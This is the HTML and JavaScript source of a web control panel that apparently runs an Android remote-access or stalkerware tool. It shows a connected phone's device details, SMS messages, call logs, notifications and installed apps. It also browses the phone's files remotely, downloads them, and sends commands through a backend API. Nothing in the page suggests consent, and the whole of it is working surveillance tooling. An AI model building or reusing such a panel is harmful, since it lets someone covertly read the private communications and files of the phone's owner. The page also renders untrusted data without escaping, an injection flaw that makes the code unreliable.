<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>G.S | Control Matrix</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@300;400;500&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-color: #0d1117;
            --primary-green: #23d18b;
            --dark-green: #1a986d;
            --text-color: #c9d1d9;
            --border-color: #30363d;
            --panel-bg: rgba(22, 27, 34, 0.8);
            --modal-bg: rgba(13, 17, 23, 0.9);
            --font-family: 'Roboto Mono', monospace;
        }

        *, *::before, *::after {
            box-sizing: border-box;
        }

        body, html {
            margin: 0;
            padding: 0;
            font-family: var(--font-family);
            background-color: var(--bg-color);
            color: var(--text-color);
            font-size: 14px;
            overflow: hidden;
        }

        .hidden { display: none !important; }

        /* --- Loader --- */
        #loader {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000;
            z-index: 10000;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        #loader-text {
            margin-bottom: 20px;
            font-size: 1.2em;
            color: var(--primary-green);
            letter-spacing: 2px;
        }

        .progress-bar {
            width: 80%;
            max-width: 400px;
            height: 4px;
            background-color: var(--border-color);
        }

        #progress {
            width: 0%;
            height: 100%;
            background: var(--primary-green);
            transition: width 0.1s linear;
            box-shadow: 0 0 10px var(--primary-green);
        }

        /* --- Main Layout --- */
        .container {
            display: grid;
            grid-template-columns: 220px 1fr;
            grid-template-rows: 60px 1fr;
            height: 100vh;
            backdrop-filter: blur(10px);
        }

        header {
            grid-column: 1 / -1;
            background: var(--panel-bg);
            border-bottom: 1px solid var(--border-color);
            padding: 0 25px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .logo {
            font-size: 1.8em;
            font-weight: 500;
            color: var(--primary-green);
            text-shadow: 0 0 8px var(--primary-green);
        }

        .status {
            display: flex;
            align-items: center;
            background: #1c2128;
            padding: 5px 15px;
            border-radius: 5px;
            border: 1px solid var(--border-color);
        }

        .status-light {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: #da3633;
            margin-right: 10px;
            box-shadow: 0 0 8px #da3633;
            transition: all 0.5s;
        }

        .status-light.connected {
            background: var(--primary-green);
            box-shadow: 0 0 8px var(--primary-green);
        }

        nav {
            grid-row: 2 / 3;
            background: var(--panel-bg);
            border-right: 1px solid var(--border-color);
            padding: 20px 0;
            display: flex;
            flex-direction: column;
        }

        nav button {
            background: none;
            border: none;
            color: var(--text-color);
            text-align: left;
            padding: 15px 25px;
            font-size: 1em;
            cursor: pointer;
            border-left: 4px solid transparent;
            transition: all 0.2s ease-in-out;
            display: flex;
            align-items: center;
            gap: 15px;
        }

        nav button:hover {
            background: rgba(45, 179, 126, 0.1);
        }

        nav button.active {
            background: #1c2128;
            border-left-color: var(--primary-green);
            color: var(--primary-green);
            font-weight: 500;
        }

        .content {
            grid-column: 2 / 3;
            grid-row: 2 / 3;
            padding: 25px;
            overflow-y: auto;
        }
        
        .tab-content { display: none; }
        .tab-content.active { display: block; }

        .tab-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }

        h2 {
            color: var(--primary-green);
            border-bottom: 1px solid var(--dark-green);
            padding-bottom: 8px;
            margin: 0;
        }
        
        .action-btn {
            background: var(--border-color);
            border: 1px solid #444;
            color: var(--text-color);
            padding: 6px 12px;
            border-radius: 5px;
            cursor: pointer;
            transition: all 0.2s;
            margin-left: 10px;
        }

        .action-btn:hover {
            background: #444;
            color: #fff;
        }

        /* --- Dashboard Specific --- */
        .info-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
            gap: 20px;
        }

        .info-card {
            background: var(--panel-bg);
            padding: 20px;
            border: 1px solid var(--border-color);
            border-radius: 6px;
        }

        .info-card strong {
            color: var(--primary-green);
            display: block;
            margin-bottom: 5px;
            font-weight: 500;
        }

        /* --- Generic Table --- */
        .data-table {
            width: 100%;
            border-collapse: collapse;
            background: var(--panel-bg);
        }
        .data-table th, .data-table td {
            padding: 12px 15px;
            text-align: left;
            border-bottom: 1px solid var(--border-color);
        }
        .data-table th {
            background: #1c2128;
            color: var(--primary-green);
            font-weight: 500;
        }

        /* --- Modal --- */
        .modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: var(--modal-bg);
            backdrop-filter: blur(5px);
            z-index: 500;
            display: flex;
            align-items: center;
            justify-content: center;
            opacity: 0;
            visibility: hidden;
            transition: all 0.3s ease;
        }

        .modal.visible {
            opacity: 1;
            visibility: visible;
        }

        .modal-content {
            background: var(--bg-color);
            border: 1px solid var(--border-color);
            width: 90%;
            max-width: 900px;
            height: 85%;
            display: flex;
            flex-direction: column;
            box-shadow: 0 0 30px rgba(35, 209, 139, 0.1);
            border-radius: 8px;
            transform: scale(0.95);
            transition: all 0.3s ease;
        }

        .modal.visible .modal-content {
            transform: scale(1);
        }

        .modal-header {
            padding: 15px 20px;
            border-bottom: 1px solid var(--border-color);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .modal-title {
            color: var(--primary-green);
            font-size: 1.4em;
        }
        .modal-close { font-size: 1.8em; cursor: pointer; }

        .modal-body {
            padding: 20px;
            flex-grow: 1;
            overflow-y: auto;
        }

        /* --- File Manager Specific --- */
        #file-manager-controls {
            margin-bottom: 15px;
        }
        #file-manager-path {
            background: #000;
            padding: 8px;
            border-radius: 4px;
            color: #aaa;
            margin-bottom: 15px;
            white-space: nowrap;
            overflow-x: auto;
        }
        .file-item {
            cursor: pointer;
            padding: 8px 5px;
            display: flex;
            align-items: center;
            gap: 10px;
            border-radius: 4px;
        }
        .file-item:hover {
            background-color: var(--border-color);
            color: var(--primary-green);
        }
    </style>
</head>
<body>

    <div id="loader">
        <div id="loader-text">MATRIX BOOT SEQUENCE...</div>
        <div class="progress-bar"><div id="progress"></div></div>
    </div>

    <div class="container hidden" id="main-container">
        <header>
            <div class="logo">G.S</div>
            <div class="status">
                <div id="status-light" class="status-light"></div>
                <span id="status-text">DISCONNECTED</span>
            </div>
        </header>
        
        <nav>
            <!-- Icons are simplified for brevity, you can use SVG or a library like FontAwesome -->
            <button class="nav-btn active" data-tab="dashboard">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M3 13h8V3H3v10zm0 8h8v-6H3v6zm10 0h8V11h-8v10zm0-18v6h8V3h-8z"/></svg>
                Dashboard
            </button>
            <button class="nav-btn" data-tab="commands">
                 <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M4 17l6-6-6-6v12zm9 4v-2.92l5.01-5.01-1.42-1.42-3.59 3.59v-4.32l-3.59 3.59-1.42-1.42 5.01-5.01v-2.92h-2.92l-5.01 5.01 1.42 1.42 3.59-3.59h4.32l3.59-3.59 1.42 1.42-5.01 5.01h2.92v2.92l5.01-5.01-1.42-1.42-3.59 3.59v4.32l3.59-3.59 1.42 1.42-5.01 5.01h-2.92v-2.92l-5.01 5.01 1.42 1.42 3.59-3.59h-4.32l-3.59 3.59-1.42-1.42 5.01-5.01h-2.92v-2.92l-5.01 5.01 1.42 1.42 3.59-3.59h4.32l3.59 3.59 1.42-1.42-5.01-5.01h-2.92v-2.92l5.01 5.01 1.42-1.42 3.59-3.59h-4.32l-3.59 3.59-1.42-1.42 5.01-5.01z"/></svg>
                Terminal
            </button>
            <button class="nav-btn" data-tab="notifications">
                 <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M12 22c1.1 0 2-.9 2-2h-4c0 1.1.89 2 2 2zm6-6v-5c0-3.07-1.64-5.64-4.5-6.32V4c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5v.68C7.63 5.36 6 7.92 6 11v5l-2 2v1h16v-1l-2-2z"/></svg>
                Notifications
            </button>
            <button class="nav-btn" data-tab="sms">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/></svg>
                SMS
            </button>
            <button class="nav-btn" data-tab="call-logs">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M20 15.5c-1.25 0-2.45-.2-3.57-.57-.35-.11-.74-.03-1.02.24l-2.2 2.2c-2.83-1.44-5.15-3.75-6.59-6.59l2.2-2.2c.28-.28.36-.67.25-1.02C8.7 6.45 8.5 5.25 8.5 4c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1 0 9.39 7.61 17 17 17 .55 0 1-.45 1-1v-3.5c0-.55-.45-1-1-1z"/></svg>
                Call Logs
            </button>
            <button class="nav-btn" data-tab="apps">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M4 8h4V4H4v4zm6 12h4v-4h-4v4zm-6 0h4v-4H4v4zm0-6h4v-4H4v4zm6 0h4v-4h-4v4zm6-10v4h4V4h-4zm-6 4h4V4h-4v4zm6 6h4v-4h-4v4zm0 6h4v-4h-4v4z"/></svg>
                Applications
            </button>
            <button onclick="showFileManager()">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M10 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2h-8l-2-2z"/></svg>
                File Manager
            </button>
        </nav>
        <div class="content">
            <!-- Dashboard -->
            <div id="dashboard" class="tab-content active">
                <div class="tab-header"><h2>Dashboard</h2></div>
                <div class="info-grid" id="device-info-grid"><p>Awaiting device synchronization...</p></div>
            </div>
            
            <!-- Terminal/Commands -->
            <div id="commands" class="tab-content">
                <!-- Implementation for terminal is complex, leaving as a simple command history -->
                <div class="tab-header"><h2>Command History</h2></div>
                 <table class="data-table">
                    <thead><tr><th>Time</th><th>Command</th><th>Response</th></tr></thead>
                    <tbody id="command-history-list"></tbody>
                </table>
            </div>

            <!-- Notifications -->
            <div id="notifications" class="tab-content">
                <div class="tab-header">
                    <h2>Notifications</h2>
                    <button class="action-btn" onclick="sendCommand('get_notifications')">Refresh</button>
                </div>
                <table class="data-table">
                    <thead><tr><th>Time</th><th>Package</th><th>Title</th><th>Text</th></tr></thead>
                    <tbody id="notifications-list"></tbody>
                </table>
            </div>
            
            <!-- Other tabs follow same structure -->
            <div id="sms" class="tab-content">
                <div class="tab-header"><h2>SMS Messages</h2><button class="action-btn" onclick="sendCommand('get_sms')">Refresh</button></div>
                <table class="data-table">
                    <thead><tr><th>From</th><th>Content</th></tr></thead>
                    <tbody id="sms-list"></tbody>
                </table>
            </div>

            <div id="call-logs" class="tab-content">
                <div class="tab-header"><h2>Call Logs</h2><button class="action-btn" onclick="sendCommand('get_calls')">Refresh</button></div>
                 <table class="data-table">
                    <thead><tr><th>Type</th><th>Number</th><th>Duration</th></tr></thead>
                    <tbody id="call-logs-list"></tbody>
                </table>
            </div>

            <div id="apps" class="tab-content">
                <div class="tab-header"><h2>Installed Apps</h2><button class="action-btn" onclick="sendCommand('get_apps')">Refresh</button></div>
                <table class="data-table">
                    <thead><tr><th>App Name</th><th>Package Name</th></tr></thead>
                    <tbody id="apps-list"></tbody>
                </table>
            </div>

        </div>
    </div>

    <!-- File Manager Modal -->
    <div id="file-manager-modal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3 class="modal-title">File Explorer</h3>
                <span class="modal-close" onclick="closeFileManager()">&times;</span>
            </div>
            <div class="modal-body">
                <div id="file-manager-controls">
                    <button class="action-btn" onclick="navigateFile('..', true)">Up</button>
                </div>
                <div id="file-manager-path">/</div>
                <table class="data-table">
                    <thead><tr><th>Name</th><th>Type</th></tr></thead>
                    <tbody id="file-manager-list"></tbody>
                </table>
            </div>
        </div>
    </div>

    <script>
        // --- Loader Logic ---
        document.addEventListener('DOMContentLoaded', () => {
            const progress = document.getElementById('progress');
            const loaderText = document.getElementById('loader-text');
            const mainContainer = document.getElementById('main-container');
            const loader = document.getElementById('loader');
            let width = 0;
            const interval = setInterval(() => {
                width += Math.random() * 3;
                if (width >= 100) {
                    width = 100;
                    progress.style.width = width + '%';
                    clearInterval(interval);
                    loaderText.textContent = "CONNECTION ESTABLISHED";
                    setTimeout(() => {
                        loader.classList.add('hidden');
                        mainContainer.classList.remove('hidden');
                        startApp();
                    }, 500);
                }
                progress.style.width = width + '%';
            }, 50);
        });

        function startApp() {
            const statusLight = document.getElementById('status-light');
            const statusText = document.getElementById('status-text');

            // --- Navigation ---
            const navButtons = document.querySelectorAll('.nav-btn');
            const tabContents = document.querySelectorAll('.tab-content');
            navButtons.forEach(btn => {
                btn.addEventListener('click', () => {
                    navButtons.forEach(b => b.classList.remove('active'));
                    btn.classList.add('active');
                    tabContents.forEach(tab => {
                        tab.classList.remove('active');
                        if(tab.id === btn.dataset.tab) tab.classList.add('active');
                    });
                    // Auto-fetch data on tab switch
                    const tabId = btn.dataset.tab;
                    if (tabId === 'sms') sendCommand('get_sms');
                    if (tabId === 'call-logs') sendCommand('get_calls');
                    if (tabId === 'apps') sendCommand('get_apps');
                });
            });

            // --- API Communication ---
            async function sendCommand(command, params = {}) {
                try {
                    await fetch('/api/command', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ command, params })
                    });
                } catch (error) {
                    console.error("Failed to send command:", error);
                }
            }
            window.sendCommand = sendCommand;

            // --- Data Rendering ---
            function updateDashboard(info) {
                const grid = document.getElementById('device-info-grid');
                grid.innerHTML = `
                    <div class="info-card"><strong>Model:</strong> ${info.Model || 'N/A'}</div>
                    <div class="info-card"><strong>Manufacturer:</strong> ${info.Manufacturer || 'N/A'}</div>
                    <div class="info-card"><strong>Android Version:</strong> ${info.AndroidVersion || 'N/A'} (SDK ${info.SDKVersion || 'N/A'})</div>
                    <div class="info-card"><strong>Battery:</strong> ${info.Battery || 'N/A'}</div>
                `;
            }

            function renderTable(tbodyId, items, rowFormatter) {
                const tbody = document.getElementById(tbodyId);
                tbody.innerHTML = items.length > 0 ? items.map(rowFormatter).join('') : `<tr><td colspan="100%">No data available.</td></tr>`;
            }

            // --- Main Update Loop ---
            setInterval(async () => {
                try {
                    const statusRes = await fetch('/api/status');
                    const status = await statusRes.json();

                    if (status.connected) {
                        statusLight.classList.add('connected');
                        statusText.textContent = "CONNECTED";
                        updateDashboard(status.device_info);

                        // Fetch all data types
                        const dataTypes = ['notifications', 'sms', 'calllogs', 'apps', 'filemanager', 'history'];
                        for (const type of dataTypes) {
                            const res = await fetch(`/api/data/${type}`);
                            const data = await res.json();
                            
                            if (type === 'notifications') renderTable('notifications-list', data, item => `<tr><td>${item.time}</td><td>${item.package}</td><td>${item.title}</td><td>${item.text}</td></tr>`);
                            if (type === 'sms') renderTable('sms-list', data, item => `<tr><td>${item.userSender}</td><td>${item.content}</td></tr>`);
                            if (type === 'calllogs') renderTable('call-logs-list', data, item => `<tr><td>${item.call_type}</td><td>${item.number}</td><td>${item.duration_seconds}s</td></tr>`);
                            if (type === 'apps') renderTable('apps-list', data, item => `<tr><td>${item.appName}</td><td>${item.packageName}</td></tr>`);
                            if (type === 'filemanager') updateFileManager(data);
                            if (type === 'history') renderTable('command-history-list', data, item => `<tr><td>${item.time}</td><td>${item.command}</td><td>${item.response}</td></tr>`);
                        }
                    } else {
                        statusLight.classList.remove('connected');
                        statusText.textContent = "DISCONNECTED";
                        document.getElementById('device-info-grid').innerHTML = '<p>Awaiting device synchronization...</p>';
                    }
                } catch (error) {
                    console.error("Update loop error:", error);
                    statusLight.classList.remove('connected');
                    statusText.textContent = "ERROR";
                }
            }, 2500);
        }

        // --- File Manager ---
        window.showFileManager = function() {
            sendCommand('file_manager', { path: '/' });
            document.getElementById('file-manager-modal').classList.add('visible');
        }
        window.closeFileManager = function() {
            sendCommand('exit_file_manager');
            document.getElementById('file-manager-modal').classList.remove('visible');
        }
        function updateFileManager(data) {
            document.getElementById('file-manager-path').textContent = data.path;
            renderTable('file-manager-list', data.files, file => 
                `<tr class="file-item" onclick="navigateFile('${file.name}', ${file.isDirectory})">
                    <td>${file.isDirectory ? '&#128193;' : '&#128196;'} ${file.name}</td>
                    <td>${file.isDirectory ? 'Directory' : 'File'}</td>
                </tr>`
            );
        }
        window.navigateFile = function(name, isDirectory) {
            const currentPath = document.getElementById('file-manager-path').textContent;
            let newPath;
            if (name === '..') {
                newPath = currentPath.substring(0, currentPath.lastIndexOf('/')) || '/';
            } else {
                newPath = currentPath === '/' ? `/${name}` : `${currentPath}/${name}`;
            }

            if (isDirectory) {
                sendCommand('file_manager', { path: newPath });
            } else {
                sendCommand('get_file', { path: newPath });
                // Optional: give user feedback that download has started
            }
        }
    </script>
</body>
</html>
